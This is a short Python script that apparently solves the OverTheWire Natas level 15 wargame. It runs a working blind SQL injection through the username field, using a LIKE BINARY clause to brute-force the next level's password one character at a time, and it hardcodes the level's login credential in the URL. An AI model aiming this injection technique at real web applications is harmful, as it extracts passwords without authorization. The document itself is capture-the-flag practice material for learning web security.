import requests
from string import ascii_letters, digits

URL = f'http://natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB@natas15.natas.labs.overthewire.org'

characters = ascii_letters + digits

password = ''
while len(password) < 32:
    for char in characters:
        payload = {'username': f'natas16" AND password LIKE BINARY "{password + char}%"#'}
        r = requests.post(URL, data=payload)
        if 'This user exists.' in r.text:
            password += char
            print(password)
            pass
